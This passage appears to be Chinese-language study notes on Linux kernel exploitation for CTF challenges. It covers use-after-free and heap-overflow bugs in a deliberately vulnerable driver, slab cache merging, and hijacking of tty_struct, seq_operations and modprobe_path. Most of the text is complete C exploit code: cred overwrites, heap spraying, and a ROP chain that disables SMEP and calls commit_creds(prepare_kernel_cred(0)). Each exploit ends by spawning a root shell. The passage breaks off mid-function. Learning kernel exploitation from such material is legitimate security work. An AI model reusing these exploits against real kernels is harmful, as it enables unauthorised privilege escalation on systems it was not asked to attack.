参考
==

<https://blog.wingszeng.top/kernel-pwn-syscall-userfaultfd-and-syscall-setxattr/>  
[https://blog.csdn.net/qq\_45323960/article/details/130660417?ops\_request\_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request\_id=171982506416800211525431&amp;biz\_id=0&amp;utm\_medium=distribute.pc\_search\_result.none-task-blog-2~blog~first\_rank\_ecpm\_v1~rank\_v31\_ecpm-2-130660417-null-null.nonecase&amp;utm\_term=kernel&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_45323960/article/details/130660417?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=171982506416800211525431&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-130660417-null-null.nonecase&utm_term=kernel&spm=1018.2226.3001.4450)

Use After Free
==============

例题 `heap bof`  
开了kaslr，smep,+smap

cred 结构体大小为 0xa8 ，根据 slub 分配机制，如果申请和释放大小为 0xa8（实际为 0xe0 ）的内存块，此时再开一个线程，则该线程的 cred 结构题正是刚才释放掉的内存块。利用 UAF 漏洞就 修改 cred 就可以实现提权。

但新版本的cred\_jar 不会与其他相同大小的 slab 合并，释放的 cred 结构体只会被放回到 cred\_jar 中，而不是合并到其他 slab 中。

因为 cred\_jar 在创建时设置了 SLAB\_ACCOUNT 标记，在 CONFIG\_MEMCG\_KMEM=y 时（默认开启）cred\_jar 不会再与相同大小的 kmalloc-192 进行合并（可以理解为cred\_jar 需要单独跟踪其内存使用情况，所以不让与其它们slab合并）

给了源码

```c
#include <asm/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>

struct class *bof_class;
struct cdev cdev;
int bof_major = 256;
char *ptr[40];// 指针数组，用于存放分配的指针
struct param { 
    size_t len;       // 内容长度
    char *buf;        // 用户态缓冲区地址
    unsigned long idx;// 表示 ptr 数组的 索引
};

long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct param p_arg;
    copy_from_user(&p_arg, (void *) arg, sizeof(struct param));
    long retval = 0;
    switch (cmd) {
        case 9:
            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);
            printk("copy_to_user: 0x%lx\n", *(long *) ptr[p_arg.idx]);
            break;
        case 8:
            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);
            break;
        case 7:
            kfree(ptr[p_arg.idx]);
            printk("free: 0x%p\n", ptr[p_arg.idx]);
            break;
        case 5:
            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);
            printk("alloc: 0x%p, size: %2lx\n", ptr[p_arg.idx], p_arg.len);
            break;
        default:
            retval = -1;
            break;
    }
    return retval;
}

static const struct file_operations bof_fops = {
        .owner = THIS_MODULE,
        .unlocked_ioctl = bof_ioctl,//linux 2.6.36内核之后unlocked_ioctl取代ioctl
};

static int bof_init(void) {
    //设备号
    dev_t devno = MKDEV(bof_major, 0);
    int result;
    if (bof_major)//静态分配设备号
        result = register_chrdev_region(devno, 1, "bof");
    else {//动态分配设备号
        result = alloc_chrdev_region(&devno, 0, 1, "bof");
        bof_major = MAJOR(devno);
    }
    printk("bof_major /dev/bof: %d\n", bof_major);
    if (result < 0) return result;
    bof_class = class_create(THIS_MODULE, "bof");
    device_create(bof_class, NULL, devno, NULL, "bof");
    cdev_init(&cdev, &bof_fops);
    cdev.owner = THIS_MODULE;
    cdev_add(&cdev, devno, 1);
    return 0;
}

static void bof_exit(void) {
    cdev_del(&cdev);
    device_destroy(bof_class, MKDEV(bof_major, 0));
    class_destroy(bof_class);
    unregister_chrdev_region(MKDEV(bof_major, 0), 1);
    printk("bof exit success\n");
}

MODULE_AUTHOR("exp_ttt");
MODULE_LICENSE("GPL");
module_init(bof_init);
module_exit(bof_exit);

```

会根据p\_arg.idx来选择chunk的i，kfree后没有清零，所以可以再次通过case 9和case 8使用，如果被其他申请后存了和内核地址相关的地址，那么通过 case 9: copy\_to\_user就能将内核地址拷贝到用户，从而泄露内核地址。并且由于case 8没有长度限制，由用户的输入决定。所以存在堆溢出

绑核
--

注意由于开启`-smp cores=2,threads=2 \`导致CPU切换进而导致kmalloc-cache-cpu切换导致重新申请的object可能不是原来刚刚kfree掉的，所以需要绑核，不绑核也有一定几率成功

```c
#define __USE_GNU
#include <sched.h>
/* to run the exp on the specific core only */
void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}
bind_cpu(sched_getcpu());
```

cred\_jar 可合并
-------------

此时cred的chunk和一样大小的chunk没有区分，可以从刚被free的相同大小的chunk申请到cred

所以free一个和cred大小一样的堆，然后再创建一个子线程，此时子线程的cred就是刚被free的chunk，然后case：8 修改之前被free的chunk来修改Cred结构体，将其uid和gid改为0

```c
 4.5 kernel/cred.c

void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}

本题（4.4.72）：

void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
                     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
}

```

### exp

> struct param*p\_arg;这里用户态定义的不可以，因为内核中`copy\_from\_user(&amp;p\_arg, (void* ) arg, sizeof(struct param));`会根据传入的地址拷贝，如果是`struct param\*p\_arg`，那么只会传入用户态地址，而`struct param p\_arg`而传入&amp;p\_arg将p\_arg相关变量压入栈

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/wait.h>

struct param {
    size_t len;       // 内容长度
    char *buf;        // 用户态缓冲区地址
    unsigned long idx;// 表示 ptr 数组的 索引
};
struct param p_arg;

int main(){
    int fd1=open("/dev/bof", O_RDWR);

    p_arg.len=0xa8;
    p_arg.buf=malloc(0xa8);
    p_arg.idx=0;

    ioctl(fd1,5,&p_arg);
    ioctl(fd1,7,&p_arg);
    if(!fork())
    {   
        p_arg.len=0x28;
        p_arg.buf=malloc(0x28);
        p_arg.idx=0;
        memset(p_arg.buf,0,p_arg.len);
        ioctl(fd1,8,&p_arg);
        if (getuid()==0)
        {
             puts("[+]root success");
            system("/bin/sh");
        }
    }
    else {
        wait(NULL);
    }
}
```

cred\_jar 不可合并
--------------

### 利用 tty\_struct 劫持程序控制流提权

[https://bbs.kanxue.com/thread-270081.htm#msg\_header\_h1\_2](https://bbs.kanxue.com/thread-270081.htm#msg_header_h1_2)

> 结构体 tty\_struct位于include/linux/tty.h 中，tty\_operations 位于 include/linux/tty\_driver.h 中。

在 /dev 下有一个伪终端设备 ptmx ，当 open("/dev/ptmx") 时, 会从 kmalloc-1k 中分配一个 tty\_struct (0x2b8)，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 tty\_operations 。

```c
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;

    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;

    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox; /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp; /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize; /* winsize_mutex */
    unsigned long stopped:1, /* flow_lock */
        flow_stopped:1,
        unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8, /* ctrl_lock */
        packet:1,
        unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room; /* Bytes free for queue */
    int flow_change;

    struct tty_struct *link;
    struct fasync_struct *fasync;
    int alt_speed; /* For magic substitution of 38400 bps */
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
};

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
    struct inode *inode, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct * tty,
        const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
        unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
    struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

```

其中 magic 是魔数, 为 0x5401

使用 tty 设备的前提是挂载了 ptmx 设备。

```bash

mkdir /dev/pts
mount -t devpts none /dev/pts
chmod 777 /dev/ptmx
```

- 泄漏内核基地址  
    需要读功能. 可以用偏移 0x18 处的 ops = ptm\_unix98\_ops, 关闭 kaslr, 从 kallsyms 中读取 ptm\_unix98\_ops. 用泄漏出来的地址减去它, 就是基址了.
- 泄漏 kmalloc-1k 堆地址  
    需要读功能. 可以用偏移 0x38 处的一个链表指针, 它初始指向自身. 读出后减去 0x38 就是当前 tty\_struct 的地址, 也是某个 kmalloc-1k 的堆地址.
- 劫持程序流  
    需要写功能, 覆盖 ops, 伪造一个 tty\_operations.修改 tty\_operations 结构体中某函数指针只能写入一个 gadget ，除了使用 pt\_regs + ret2dir 外还可以利用 tty\_struct 执行tty\_operations 内相关函数指针时的特性。
- write (tty\_write-&gt;do\_tty\_write-&gt;n\_tty\_write-&gt;pty\_write)  
    比如使用 write. 当跳转到 write 时（断点断在pty\_write） 观察寄存器, 发现 rax 就是 tty\_struct.ops, 可以找 gadget 如 mov rsp, rax 进行栈迁移, 这样可以覆盖 tty\_struct.ops 之前的数据来 ROP. 不过这个空间有点小, 不够 ROP 还得再一次栈迁移.

但注意的是劫持write时会对tty的魔数检查

- ioctl （tty\_ioctl-&gt;pty\_unix98\_ioctl）  
    或者使用 ioctl, 它可以通过传递参数控制一些寄存器的值. 需要注意的是, 要使用 ioctl 必须保证魔数正确, driver 是一个内核堆地址.  
    当走到这一步时, rbp = &amp;tty\_struct(有时 rbp 不是 &amp;tty\_struct), 如果将 tty-&gt;op-&gt;ioctl 设为 leave; ret, 即可先将栈迁移到 &amp;tty\_struct + 0x8 处. 将这里设为 pop rsp; ret, &amp;tty\_struct + 0x10 (.driver) 处设为布置有 ROP 链的内核堆地址, 完成第二次栈迁移.
    
    另外此时rax = pty\_unix98\_ioctl函数地址的，如果xchg eax esp ret，会把栈迁移到rax&amp; 0xffffffff，此时该栈会跑到用户态去，然后我们在用户态地方mmap布置相应的rop链就行，但需要关闭smap

这里使用覆盖tty\_operations;为用户态程序伪造的tty\_operations，所以是需要关闭smap的

- 开启了smap怎么办呢？由于其他地方我们可以控制，我们保证tty\_operations是在内核中就行了。我们可以使得 覆盖 ops 函数表为 tty\_addr + 0x20 - 0x60, 那么 ioctl 会指向 tty\_addr + 0x20 这里, 因为这里是我们可以控制的位置. 我们向这里输入栈迁移gadget 的地址，其他函数同理

> write建议在op上构造rop链，ioctl可以在tty上构造rop链
> 
> ### exp

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

size_t pop_rdi_ret = 0xffffffff8109047d;
size_t mov_cr4_rdi_pop_rbp_ret = 0xffffffff81004d70;
size_t swapgs_pop_rbp_ret = 0xffffffff81063654;
size_t iretq = 0xffffffff8107c0a6;
size_t xchg_eax_esp_ret = 0xffffffff8100008a;

struct tty_operations {
    struct tty_struct *(*lookup)(struct tty_driver *driver, struct file *filp, int idx);

    int (*install)(struct tty_driver *driver, struct tty_struct *tty);

    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);

    int (*open)(struct tty_struct *tty, struct file *filp);

    void (*close)(struct tty_struct *tty, struct file *filp);

    void (*shutdown)(struct tty_struct *tty);

    void (*cleanup)(struct tty_struct *tty);

    int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);

    int (*put_char)(struct tty_struct *tty, unsigned char ch);

    void (*flush_chars)(struct tty_struct *tty);

    int (*write_room)(struct tty_struct *tty);

    int (*chars_in_buffer)(struct tty_struct *tty);

    int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);

    long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);

    void (*set_termios)(struct tty_struct *tty, struct ktermios *old);

    void (*throttle)(struct tty_struct *tty);

    void (*unthrottle)(struct tty_struct *tty);

    void (*stop)(struct tty_struct *tty);

    void (*start)(struct tty_struct *tty);

    void (*hangup)(struct tty_struct *tty);

    int (*break_ctl)(struct tty_struct *tty, int state);

    void (*flush_buffer)(struct tty_struct *tty);

    void (*set_ldisc)(struct tty_struct *tty);

    void (*wait_until_sent)(struct tty_struct *tty, int timeout);

    void (*send_xchar)(struct tty_struct *tty, char ch);

    int (*tiocmget)(struct tty_struct *tty);

    int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear);

    int (*resize)(struct tty_struct *tty, struct winsize *ws);

    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);

    int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount);

    const struct file_operations *proc_fops;
};

struct param {
    size_t len;
    char *buf;
    long long idx;
};
#define KERNCALL __attribute__((regparm(3)))

void *(*prepare_kernel_cred)(void *)KERNCALL =(void *) 0xffffffff810a1730;

void *(*commit_creds)(void *)KERNCALL =(void *) 0xffffffff810a1340;

void get_shell() { system("/bin/sh"); }

void get_root() { commit_creds(prepare_kernel_cred(0)); }

size_t user_cs, user_rflags, user_sp, user_ss;

void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}

#define __USE_GNU

#include <sched.h>

void bind_cpu(int core) {
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

const int BOF_NUM = 40;
const int PTMX_NUM = 0x100;

int main() {
    bind_cpu(sched_getcpu());

    int bof_fd = open("/dev/bof", O_RDWR);
    if (bof_fd == -1) {
        puts("[-] open bof device failed!");
        return -1;
    }

    struct param p;
    p.buf = malloc(p.len = 0x2e0);

    // 让驱动分配 BOF_NUM 个 0x2e0  的内存块
    for (p.idx = BOF_NUM - 1; p.idx >= 0; p.idx--) {
        ioctl(bof_fd, 5, &p); // malloc
    }

    // 释放 BOF_NUM 个申请的内存块
    for (p.idx = BOF_NUM - 1; p.idx >= 0; p.idx--) {
        ioctl(bof_fd, 7, &p);  // free
    }

    // 批量 open /dev/ptmx, 喷射 tty_struct
    int ptmx_fds[PTMX_NUM];
    for (int i = 0; i < PTMX_NUM; ++i) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ptmx_fds[i] == -1) {
            puts("[-] open ptmx err");
        }
    }

    p.idx = 0;
    ioctl(bof_fd, 9, &p);
    // 此时如果释放后的内存被 tty_struct 占用，那么他的开始字节序列应该为 1 54  0  0  1  0  0  0  0  0  0  0  0  0  0  0
    for (int i = 0; i < 16; ++i) {
        printf("%2x%c", p.buf[i], i == 15 ? '\n' : ' ');
    }

    // 利用 tty_operations 指针泄露内核基址
    size_t offset = (*(size_t *) &p.buf[0x18]) - 0xffffffff81a8b020;
    printf("[*] offset: %p\n", offset);
    commit_creds = (void *) ((size_t) commit_creds + offset);
    prepare_kernel_cred = (void *) ((size_t) prepare_kernel_cred + offset);
    pop_rdi_ret += offset;
    mov_cr4_rdi_pop_rbp_ret += offset;
    swapgs_pop_rbp_ret += offset;
    iretq += offset;
    xchg_eax_esp_ret += offset;

    // 伪造 tty_operations 结构体
    struct tty_operations *fake_tty_operations = (struct tty_operations *) malloc(sizeof(struct tty_operations));
    memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    fake_tty_operations->ioctl = (void *) xchg_eax_esp_ret;
    fake_tty_operations->close = (void *) xchg_eax_esp_ret;

    // 布局 rop 链
    save_status();
    size_t rop_chain[] = {
            pop_rdi_ret,
            0x6f0,
            mov_cr4_rdi_pop_rbp_ret,
            0,
            (size_t) get_root,
            swapgs_pop_rbp_ret,
            0,//padding
            iretq,
            (size_t) get_shell,
            user_cs,
            user_rflags,
            user_sp,
            user_ss
    };

    // 触发漏洞前先把 rop 链拷贝到 mmap_base
    void *mmap_base = (void *) (xchg_eax_esp_ret & 0xffffffff);
    void *mmap_addr = mmap(mmap_base - 0x1000, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("[*] mmap_addr: %p\n", mmap_addr);
    memset(mmap_addr, 0, 0x30000);
    memcpy(mmap_base, rop_chain, sizeof(rop_chain));

    // 批量修改 tty_struct 的 ops 指针
    *(size_t *) &p.buf[0x18] = (size_t) fake_tty_operations;
    for (p.idx = 0; p.idx < BOF_NUM; p.idx++) {
        ioctl(bof_fd, 8, &p);
    }

    // 调用 tty_operations.ioctl 和 tty_operations.close 触发漏洞
    for (int i = 0; i < PTMX_NUM; ++i) {
        ioctl(ptmx_fds[i], 0, 0);
    }

    return 0;
}

```

Heap Overflow
=============

[查看slab缓存的使用](https://www.cnblogs.com/arnoldlu/p/10769376.html)或者sudo slabtop能动态查看

排布溢出修改 cred
-----------

溢出修改 cred ，和前面 UAF 修改 cred 一样，在新版本失效。因为不在同一个cache中，导致内存不一定相邻了

kalloc会自动调整大小，可以查看/proc/slabinfo来得知，一般是往上调大。  
这里一般利用分配的大小和cred的大小在一个kmem-cache中，然后分配一部分使得slub中的freelist中的object地址保持连续，使得接下来的这两个也保持连续就可以达到溢出的效果，或者利用分配大量的相同的大小的kmem-cache，然后当free掉其中一个。再fork可能申请到的就是这个刚刚free的，然后这个刚刚free的前面的会与之相邻

### exp

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>

struct param {
    size_t len;    // 内容长度
    char *buf;     // 用户态缓冲区地址
    long long idx; // 表示 ptr 数组的 索引
};

int main(void) {
    int bof_fd = open("/dev/bof", O_RDWR);
    if (bof_fd == -1) {
        puts("[-] Failed to open bof device.");
        exit(-1);
    }
    struct param p = {0xa8, malloc(0xa8), 0};
    ioctl(bof_fd, 5, &p);  // malloc

    puts("[*] clear heap done");

    p.idx=1;
    ioctl(bof_fd, 5, &p);  // malloc

    ioctl(bof_fd, 7, &p); // free

    int pid = fork();
    if (pid < 0) {
        puts("[-] fork error");
        exit(-1);
    }

   p.len=0xc0 + 0x28;
   p.buf=malloc( 0xc0 + 0x28);
   p.idx=0;
    memset(p.buf, 0, p.len);
    ioctl(bof_fd, 8, &p);
    if (!pid) {
        size_t uid = getuid();
        printf("[*] uid: %zx\n", uid);
        if (!uid) {
            puts("[+] root success");
            system("/bin/sh");
        } else {
            puts("[-] root fail");
        }
    } else {
        wait(0);
    }
    return 0;
}
```

堆溢出 + 堆喷射覆写 seq\_operations 控制内核执行流
-----------------------------------

[InCTF-Kqueue](https://blog.csdn.net/qq_54218833/article/details/124521291?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172258946616800184152959%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=172258946616800184152959&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-124521291-null-null.nonecase&utm_term=%E5%86%85%E6%A0%B8&spm=1018.2226.3001.4450)  
只开启了 kaslr 保护，没开 KPTI 也没开 smap&amp;smep  
给了源码大致逻辑如下

- ioctl分为分别根据命令执行相关的函数，有增删改存
- create\_kqueue会创建一个队列，其大概布局如下，最后这块内存首地址保存在kququs数组中

```c
 if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
        err("[-] Integer overflow");

    /* Size is the size of queue structure + size of entry * request entries */
    ull queue_size = 0;
    if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
        err("[-] Integer overflow");
```

request.max\_entries为0xffffffff时request.max\_entries+1=0，此时queue\_size=sizeof(queue)，那么此时queue只有queue没有entry

- delete\_kqueue根据参数中的queue\_idx去free掉对应的kqueues
- edit\_kqueue根据参数中queue\_idx找到哪个队列，再根据entry\_idx找到该队列对应的第几个元素，将参数的data指向的内容拷贝给元素的data指针
- 首先根据queue\_idx找到对应的queue，save\_kqueue\_entries会分配queue\_size大小，然后这里存储queue-&gt;data和该队列所有的kqueue\_entry-&gt;data
    
    err("\[-\] Entry size limit exceed");函数只是输出下，没啥影响，根据前面的如果为0x20，而这里data\_size是用户的参数，data也是用户参数，所以存在任意长度溢出

```c
   char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));

    /* Each saved entry can have its own size */
    if(request.data_size > queue->queue_size)
        err("[-] Entry size limit exceed");

    /* Copy main's queue's data */
    if(queue->data && request.data_size)
        validate(memcpy(new_queue,queue->data,request.data_size));
    else

```

本题的漏洞利用方式需要借助一个结构体：seq\_operations，大小为0x20（与queue相同），包含4个指针：

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
}
```

这是序列文件必备的结构体，相当于一个迭代器，能够循环输出某些内容，常用于导出数据与记录，便于管理大数据文件。当一个定义了这个结构体的LKM被打开（如使用cat命令或者read）时，内核就会创建这样的一个数据结构，并首先调用start函数指针。由于这个结构体的大小为0x20，因此其很有可能与上面的queue分配到相距不远的地方。如果能够控制这里的start指针，就能够控制内核执行流。本题打开的序列文件为/proc/self/stat。

这里`open("/proc/self/stat", O_RDONLY);`堆喷一部分0x20大小的堆，然后free掉中间一个，此时可能分配的某个堆是在被free的后面一个（但不是），所以将所有的open的描述符都尝试read

在调用start前，内核将下一条指令的地址压入栈中，我们利用的就是这个地址，来获取内核的加载基址，进而通过偏移commit\_cred(prepare\_kernel\_cred(NULL))函数

但由于我们劫持到的是函数指针，一开始还是会有push rbp，所以此时泄露地址在rsp+8。然后将泄露地址加上相关偏移再通过cll 寄存器的形式调用函数

### exp

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

void create_kqueue(int fd,uint32_t max_entries,uint16_t data_size)
{
    request_t request={
        .max_entries=max_entries,
        .data_size=data_size,
    };
    ioctl(fd,0xDEADC0DE,&request);
}

void edit_kqueue(int fd,uint16_t entry_idx,uint16_t queue_idx,char* data)
{
    request_t request={
        .queue_idx=queue_idx,
        .entry_idx=entry_idx,
        .data=data,
    };
    ioctl(fd,0xDAADEEEE,&request);
}

void save_kqueue(int fd,uint32_t max_entries,uint16_t data_size,uint16_t queue_idx)
{
    request_t request={
        .max_entries=max_entries,
        .data_size=data_size,
        .queue_idx=queue_idx,
    };
    ioctl(fd,0xB105BABE,&request);
}
void shell()
{
    __asm__(
            "mov r12, [rsp + 0x8];"
            "sub r12, 0x201179;"
            "mov r13, r12;"
            "add r12, 0x8c580;"// prepare_kernel_cred
            "add r13, 0x8c140;"// commit_creds
            "xor rdi, rdi;"
            "call r12;"
            "mov rdi, rax;"
            "call r13;"
            "swapgs;"
            "push user_ss;"
            "push user_sp;"
            "push user_rflags;"
            "push user_cs;"
            "push user_rip;"
            "iretq;");
}
// typedef struct{
//     uint16_t data_size;
//     uint64_t queue_size; /* This needs to handle larger numbers */
//     uint32_t max_entries;
//     uint16_t idx;
//     char* data;
// }queue;
void get_shell()
{
    system("/bin/sh");
}
size_t user_cs, user_rflags, user_sp, user_ss, user_rip = (size_t) get_shell;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("[*] status has been saved.");
}

int main()
{
    save_status();
    int fd1=open("/dev/kqueue",O_RDONLY);
    create_kqueue(fd1,0xffffffff,0x40);
    size_t * shellcode=malloc(0x40);
    for(int i=0;i<8;i++)
    {
        shellcode[i]=shell;
    }

    edit_kqueue(fd1,0,0,shellcode);
    int seq_fd[0x100];
    for(int i=0;i<0x100;i++)
    {
        seq_fd[i]=open("/proc/self/stat", O_RDONLY);
    }
    close(seq_fd[0x50]);

    save_kqueue(fd1,0xffffffff,0x40,0);

     for(int i=0;i<0x100;i++)
    {
       read(seq_fd[i], shellcode, 1); 
    }

    return 0;
}
```

Arbitrary Address Allocation（freelist 劫持）
=========================================

modprobe\_path提权
----------------

[https://h0pe-ay.github.io/%E5%88%A9%E7%94%A8modprobe\_path%E6%8F%90%E6%9D%83/](https://h0pe-ay.github.io/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/)  
modprobe\_path中存储了一个名为modprobe的程序的路径，该程序用于向Linux 内核添加可加载内核模块或从内核中删除可加载内核模块。

在执行一个错误文件头的文件，会调用modprobe\_path指向的程序，调用路径如下

```bash
entry_SYSCALL_64()
    sys_execve()
        do_execve()
            do_execveat_common()
                bprm_execve()
                    exec_binprm()
                        search_binary_handler()
                            __request_module() // wrapped as request_module
                                call_modprobe()
```

其中 call\_modprobe() 定义于 kernel/kmod.c，我们主要关注这部分代码（以下来着内核源码 5.14）：

```c
static int call_modprobe(char *module_name, int wait)
{
    //...
    argv[0] = modprobe_path;
    argv[1] = "-q";
    argv[2] = "--";
    argv[3] = module_name;  /* check free_modprobe_argv() */
    argv[4] = NULL;

    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    if (!info)
        goto free_module_name;

    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
    //...
```

在这里调用了函数 call\_usermodehelper\_exec() 将 modprobe\_path 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为/sbin/modprobe。

```bash
cat /proc/kallsyms  | grep modprobe_path
或者
search /sbin/modprobe
```

- 接着程序需要能够进行任意地址写，并利用任意地址写往modprobe\_path写入需要执行的程序路径名
- 构造一个非法的文件头，如ffffffff，促使内核进入call\_modprobe函数

利用
--

> Ctrl+A, 然后 C：可以切换到QEMU Monitor 模式。  
> 应该使用 -monitor none 参数来禁用 Monitor。  
> 或者使用 -monitor /dev/null 将 Monitor 重定向到 /dev/null。

```bash
cat /sys/devices/system/cpu/vulnerabilities/*查看开了KPTI
kaslr smep smap都开了
```

当调用 kmem\_cache\_create 创建新的 cache 时，内核会首先检查是否已经存在具有相同特征的 cache。如果找到匹配的现有 cache，内核会返回这个现有的 cache，而不是创建一个新的。这里没有设置SLAB\_ACCOUNT 所以会返回现有的cache

调试这里记得改改`rdinit=/init`，init为字节创建的，然后里面参考相关init就行，最后以root方式启动

```c
void __fastcall xkmod_ioctl(__int64 a1, int cmd, char *data)
{
  void *p_input; // rdi
  char *v5; // rsi
  struct input input; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( data )
  {
    p_input = &input;
    v5 = data;
